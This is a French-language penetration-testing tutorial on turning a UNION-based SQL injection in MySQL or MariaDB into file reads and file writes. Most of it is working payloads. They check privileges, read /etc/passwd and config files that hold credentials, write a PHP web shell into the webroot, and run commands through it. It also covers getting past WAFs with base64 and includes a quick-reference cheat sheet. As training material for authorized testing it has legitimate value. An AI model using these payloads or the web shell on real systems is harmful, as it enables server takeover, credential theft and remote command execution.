# Lecture et ecriture de fichiers

## Pourquoi

Au-dela de l'extraction de donnees, une injection SQL peut permettre de lire des fichiers arbitraires sur le serveur (code source, configuration, `/etc/passwd`) et, dans les cas les plus favorables, d'ecrire des fichiers. L'ecriture de fichiers mene directement a l'execution de code via un web shell. C'est le passage de l'extraction de donnees a la compromission du serveur.

## Comment ca marche

### Privileges requis

La lecture et l'ecriture de fichiers necessitent le privilege `FILE` dans MySQL. Ce privilege est reserve aux utilisateurs avec des droits eleves (souvent `root` ou DBA).

### Verifier les privileges

```sql
-- Identifier l'utilisateur courant
cn' UNION SELECT 1,user(),3,4-- -

-- Verifier si l'utilisateur a les privileges super admin
cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user='root'-- -
-- Resultat 'Y' = super admin

-- Lister tous les privileges
cn' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Le privilege `FILE` dans la liste confirme que la lecture et l'ecriture sont possibles.

### La variable secure_file_priv

Meme avec le privilege `FILE`, la variable `secure_file_priv` peut restreindre les operations :

| Valeur | Effet |
|---|---|
| Vide (`""`) | Lecture/ecriture dans tout le systeme de fichiers |
| Chemin (`/var/lib/mysql-files`) | Lecture/ecriture uniquement dans ce repertoire |
| `NULL` | Lecture/ecriture interdites |

```sql
cn' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
```

{% hint style="info" %}
MariaDB a `secure_file_priv` vide par defaut (lecture/ecriture partout). MySQL utilise `/var/lib/mysql-files` par defaut, ce qui bloque la plupart des exploitations.
{% endhint %}

## En pratique

### Lecture de fichiers avec LOAD_FILE()

```sql
-- Lire /etc/passwd
cn' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -

-- Lire le code source de l'application
cn' UNION SELECT 1,LOAD_FILE('/var/www/html/search.php'),3,4-- -

-- Lire la configuration de la base
cn' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -
```

{% hint style="warning" %}
`LOAD_FILE()` retourne `NULL` si le fichier n'existe pas, si les permissions systeme l'interdisent, ou si `secure_file_priv` bloque l'acces. Pas d'erreur explicite.
{% endhint %}

La lecture de `config.php` ou d'un fichier de configuration equivalent peut reveler les identifiants de connexion a la base de donnees. Ces identifiants peuvent ensuite etre reutilises pour un acces direct au SGBD.

Pour lire du code PHP, le navigateur interprete le HTML. Utiliser `Ctrl+U` (code source) pour voir le PHP brut.

### Ecriture de fichiers avec INTO OUTFILE

Trois conditions doivent etre reunies :

1. Privilege `FILE` active
2. `secure_file_priv` vide ou pointant vers le webroot
3. Permissions d'ecriture sur le repertoire cible

```sql
-- Ecrire un fichier de test dans le webroot
cn' UNION SELECT 1,'Fichier cree avec succes',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

{% hint style="info" %}
`INTO OUTFILE` ecrit toutes les colonnes du resultat dans le fichier. Les valeurs de junk data (1, 3, 4) apparaissent dans le fichier. Utiliser des chaines vides (`""`) pour un fichier plus propre.
{% endhint %}

### Ecrire un web shell

```sql
cn' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Une fois le fichier ecrit, y acceder via le navigateur :

```
http://<IP_CIBLE>/shell.php?0=id
```

Le parametre `0` contient la commande systeme a executer. Le resultat est affiche dans la page.

### Trouver le webroot

Si le chemin du webroot n'est pas connu, le deduire en lisant la configuration du serveur web :

```sql
-- Apache
cn' UNION SELECT 1,LOAD_FILE('/etc/apache2/apache2.conf'),3,4-- -

-- Nginx
cn' UNION SELECT 1,LOAD_FILE('/etc/nginx/nginx.conf'),3,4-- -
cn' UNION SELECT 1,LOAD_FILE('/etc/nginx/sites-available/default'),3,4-- -
```

Chemins de webroot courants : `/var/www/html`, `/var/www`, `/usr/share/nginx/html`, `/var/www/public`.

## Pieges et galeres

- `INTO OUTFILE` echoue silencieusement si le fichier existe deja. On ne peut pas ecraser un fichier existant.
- Le fichier ecrit appartient a l'utilisateur `mysql`. Le serveur web (Apache/Nginx) doit pouvoir le lire pour que le web shell fonctionne.
- Les WAF peuvent bloquer les payloads contenant `<?php` ou `system`. Encoder le payload en base64 et utiliser `FROM_BASE64()` peut contourner certains filtres.
- L'ecriture de fichiers laisse des traces evidentes sur le serveur. En engagement, documenter chaque fichier cree et le supprimer en fin de test (ou le signaler au client).
- Sur MySQL (pas MariaDB), `secure_file_priv` est souvent configure a `/var/lib/mysql-files`, rendant l'ecriture dans le webroot impossible par defaut.

## Retour terrain

La chaine complete d'exploitation SQLi vers RCE suit cette progression : injection UNION confirmee, lecture de fichiers (config, source), ecriture d'un web shell, execution de commandes. En engagement, c'est la demonstration d'impact maximale pour une SQLi.

Toujours commencer par la lecture : `LOAD_FILE('/etc/passwd')` confirme que les permissions sont suffisantes. Ensuite, lire la configuration du serveur web pour trouver le webroot. Enfin, ecrire le web shell au bon endroit.

## Memo express

| Objectif | Requete |
|---|---|
| Utilisateur courant | `SELECT user()` |
| Privilege super admin | `SELECT super_priv FROM mysql.user WHERE user='root'` |
| Privilege FILE | `SELECT privilege_type FROM information_schema.user_privileges` |
| secure_file_priv | `SELECT variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'` |
| Lire un fichier | `SELECT LOAD_FILE('/chemin/fichier')` |
| Ecrire un fichier | `SELECT '...' INTO OUTFILE '/chemin/fichier'` |
| Web shell PHP | `<?php system($_REQUEST[0]); ?>` |
| Fichiers de config | `/etc/apache2/apache2.conf`, `/etc/nginx/sites-available/default` |

***
